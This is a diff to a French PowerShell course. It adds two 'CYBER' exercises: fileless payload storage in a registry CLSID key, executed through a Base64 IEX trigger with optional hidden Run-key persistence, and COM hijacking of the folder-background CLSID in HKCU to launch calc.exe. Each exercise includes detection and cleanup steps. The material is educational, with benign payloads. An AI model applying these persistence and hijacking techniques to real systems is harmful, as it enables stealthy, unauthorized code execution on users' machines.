@@ -142,12 +142,9 @@ On utilise `Remove-Item` avec le chemin de la clé.
 5. **Enfin, nettoyez votre environnement en supprimant les clés `AnciennesVersions` et `CopieAnciennesVersions**`.
 
 * *Note : Utilisez le paramètre `-Recurse` pour la suppression des clés qui contiennent des sous-clés ou des valeurs*.
-
 ---
-Voici un exercice guidé conçu pour apprendre à réaliser les mêmes actions de persistance (souvent utilisées en cybersécurité ou pour l'automatisation) en utilisant uniquement **PowerShell** au lieu de l'interface graphique `regedit.exe`.
-
+# SUITE Adaptation en exercices CYBER, guidés sur PowerShell pour l'étude de cas
 ---
-
 # Exercice 4: CYBER >>> Automatisation de la Persistance via PowerShell
 **Objectif :** Reproduire le mécanisme de lancement automatique d'un programme au démarrage de la session utilisateur, mais de manière scriptée avec les cmdlets de registre.
 
@@ -524,5 +521,141 @@ Set-ItemProperty -Path . -Name "Userinit" -Value $originalUserinit
 1. **Résilience :** Le processus `userinit.exe` étant de confiance, les modifications passent souvent pour des scripts d'entreprise.
 2. **Exécution précoce :** Elle intervient avant même l'affichage du bureau (`explorer.exe`).
 
+ 
 ---
+# Exercice 9 : CYBER >>> Technique du "Fileless Malware" (Stockage en Registre)
+**Objectif :** Simuler le stockage d'un script complet dans une clé de registre et créer une amorce capable de le lire et de l'exécuter sans que le script ne soit jamais présent sous forme de fichier sur le disque.
+### Étape 1 : Préparation de la charge utile (Payload)
+Nous allons simuler un script inoffensif (qui affiche "Système compromis (Simulé)") mais nous allons l'encoder en Base64 pour le rendre illisible à l'œil nu, comme le ferait un attaquant.
+**Action :** Encodez une commande PowerShell en Base64.
+```powershell
+# Le script à cacher
+$script = 'Write-Host "ALERTE : Code execute directement depuis la RAM !" -ForegroundColor Red'
+
+# Encodage en Base64
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encodedScript = [Convert]::ToBase64String($bytes)
+
+Write-Host "Votre payload encode : $encodedScript"
+
+```
+
+---
+### Étape 2 : Stockage de la charge utile dans le registre
+Nous allons cacher ce code dans une clé qui semble technique et légitime (un CLSID fictif) dans la ruche utilisateur.
+**Action :** Créez une clé de registre obscure et stockez-y le script encodé.
+```powershell
+# Création d'une clé simulant un identifiant système
+$path = "HKCU:\Software\Classes\CLSID\{A8B1-F92C-41D0-9234}"
+New-Item -Path $path -Force
+
+# Stockage du script dans une valeur nommée "Data"
+New-ItemProperty -Path $path -Name "Data" -PropertyType String -Value $encodedScript
+
+```
+
+---
+### Étape 3 : Création de l'amorce (Trigger)
+L'amorce est une petite commande qui va chercher le code dans le registre, le décode et l'exécute avec la commande `IEX` (Invoke-Expression).
+**Action :** Testez la commande qui permet de lire et d'exécuter le code stocké à l'étape précédente.
+```powershell
+# Commande de lecture et d'exécution
+$trigger = "IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-ItemProperty '$path').Data)))"
+
+# Test de l'exécution
+Invoke-Expression $trigger
+
+```
+
+---
+### Étape 4 : Mise en place de la persistance (Optionnel)
+Pour qu'un attaquant n'ait plus rien à faire, il placerait cette commande d'amorce dans une clé de démarrage (Run).
+**Action :** (Théorique) Imaginez la commande pour placer ce trigger dans la clé Run vue à l'exercice 1.
+```powershell
+# NE PAS EXECUTER - Exemple de persistance réelle
+# Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateService" -Value "powershell.exe -WindowStyle Hidden -Command $trigger"
+
+```
+
+---
+### Étape 5 : Analyse Forensics (Détection par script)
+En tant que défenseur, vous devez détecter les valeurs de registre trop volumineuses qui pourraient contenir du code caché.
+**Action :** Listez les valeurs de la clé CLSID et vérifiez leur longueur.
+```powershell
+# Audit de la taille des données
+$valeur = Get-ItemProperty -Path $path
+$taille = $valeur.Data.Length
+
+Write-Host "Analyse de la cle : $path"
+Write-Host "Taille de la chaine detectee : $taille caracteres"
+
+if ($taille -gt 50) {
+    Write-Warning "Suspicion de Fileless Malware : Valeur anormalement longue detectee !"
+}
+
+```
+
+---
+# Exercice 10 : CYBER >>> Détournement d'objets COM (COM Hijacking)
+
+**Objectif :** Utiliser PowerShell pour détourner un composant système (le gestionnaire de dossiers) afin qu'il exécute une action personnalisée à chaque fois que l'utilisateur ouvre son explorateur de fichiers.
+
+### Étape 1 : Comprendre le mécanisme de priorité
+Windows cherche les objets COM d'abord dans la ruche utilisateur (`HKCU`) avant de regarder dans la ruche système (`HKLM`). Si un attaquant crée une copie d'un objet système dans `HKCU`, sa version sera exécutée en priorité.
+**Action :** Définissez les variables pour un objet COM très courant (le "Folder Background" utilisé par l'Explorateur).
+```powershell
+# Identifiant de classe (CLSID) pour l'objet de fond de dossier
+$clsid = "{00021401-0000-0000-C000-000000000046}"
+$path = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
+
+```
+
+---
+### Étape 2 : Création de l'arborescence de détournement
+Nous allons créer la structure de clés nécessaire dans la ruche utilisateur. Comme l'objet n'existe probablement pas encore dans `HKCU`, nous devons le créer.
+**Action :** Créez la clé `InprocServer32` pour ce CLSID.
+
+```powershell
+# Création récursive de la clé
+New-Item -Path $path -Force
+
+```
+
+---
+### Étape 3 : Injection du script de détournement
+Au lieu de pointer vers une bibliothèque système (`.dll`), nous allons faire pointer la valeur par défaut vers un script ou un exécutable de notre choix. Pour cet exercice, nous utiliserons `calc.exe`.
+**Action :** Modifiez la valeur par défaut et définissez le modèle de threading.
+```powershell
+# Définir le chemin vers l'exécutable de "remplacement"
+Set-ItemProperty -Path $path -Name "(default)" -Value "C:\Windows\System32\calc.exe"
+
+# Définir le ThreadingModel (requis pour que l'objet soit valide)
+New-ItemProperty -Path $path -Name "ThreadingModel" -PropertyType String -Value "Apartment"
+
+```
+
+---
+### Étape 4 : Test et Observation
+**Action :** Ouvrez simplement l'Explorateur de fichiers Windows (touche Windows + E) ou faites un clic droit sur le bureau.
+* **Résultat attendu :** La calculatrice devrait se lancer. Windows, en voulant charger les fonctions d'affichage des dossiers, a lu votre entrée dans `HKCU` et a exécuté `calc.exe` au lieu de la bibliothèque système habituelle.
+
+---
+### Étape 5 : Nettoyage Forensics
+Il est crucial de ne pas laisser ce détournement actif car il ralentit et perturbe le système.
+
+**Action :** Supprimez la clé CLSID que vous avez créée dans la ruche utilisateur.
+
+```powershell
+# Suppression du détournement COM
+Remove-Item -Path "HKCU:\Software\Classes\CLSID\$clsid" -Recurse
+
+```
+
+---
+### Pourquoi cette méthode est-elle redoutable ?
+
+1. **Pas de droits Admin :** Comme on modifie `HKCU` (la ruche utilisateur), aucun privilège administrateur n'est requis.
+2. **Invisibilité :** Aucun nouveau processus n'est créé au démarrage. Le code malveillant attend simplement que le système ait besoin d'une fonction standard pour "s'inviter" dans le processus légitime.
+3. **Persistance profonde :** Il existe des milliers d'objets COM dans Windows, rendant la surveillance manuelle presque impossible sans outils spécialisés.
+
  
